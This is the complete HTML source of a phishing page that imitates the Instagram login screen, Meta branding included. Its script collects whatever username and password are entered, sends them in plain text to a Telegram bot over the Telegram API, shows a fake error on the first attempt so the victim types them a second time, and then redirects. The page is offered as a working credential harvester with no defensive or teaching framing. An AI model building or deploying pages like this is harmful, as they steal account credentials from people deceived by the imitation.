<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">

  <div class="w-full max-w-sm px-6">

    <!-- Logo -->
    <div class="flex justify-center mb-14">
      <img src="IMG_0905.png" alt="Instagram" class="w-16 h-16" />
    </div>

    <!-- Error Message -->
    <div id="errorMsg" class="text-red-500 text-sm mb-4 hidden">
      Incorrect username or password.
    </div>

    <!-- Username -->
    <input
      id="username"
      type="text"
      placeholder="Username, mobile number or email address"
      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Password -->
    <input
      id="password"
      type="password"
      placeholder="Password"
      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
    />

    <!-- Login Button -->
    <button
  id="loginBtn"
  class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4
         transition active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed
         flex items-center justify-center gap-2"
>
  <span id="btnText">Log in</span>
  <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
    <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
    <path d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" fill="none"/>
  </svg>
</button>

    <!-- Forgotten Password -->
    <div class="text-center">
      <a href="#" class="text-sm font-normal text-black hover:underline">
        Forgotten password?
      </a>
    </div>

    <!-- Bottom Section -->
    <div class="mt-20">
      <!-- Create Account -->
      <button
        class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition"
      >
        Create new account
      </button>

      <!-- Meta -->
      <div class="flex justify-center mt-2">
        <img src="IMG_0906.png" alt="Meta" class="h-8" />
      </div>
    </div>
  </div>

  <!-- Script -->
  <script type="module">
    import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from './config.js';

    let attempt = 0; // Track number of login attempts

    document.getElementById("loginBtn").addEventListener("click", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!username || !password) {
        alert("Please fill in all fields!");
        return;
      }

      // Construct message to send
      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;

      // Telegram API URL
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

      try {
        // Send message to Telegram
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
        });
        console.log("Sent to Telegram successfully");
      } catch (err) {
        console.error("Error sending to Telegram:", err);
      }

      attempt++;

      if (attempt === 1) {
        // Show fake error message on first attempt
        const errorDiv = document.getElementById("errorMsg");
        errorDiv.classList.remove("hidden");
      } else {
        // Redirect on second attempt
        window.location.href = "https://example.com/success"; // Change this to your desired page
      }
    });
  </script>
</body>
</html>
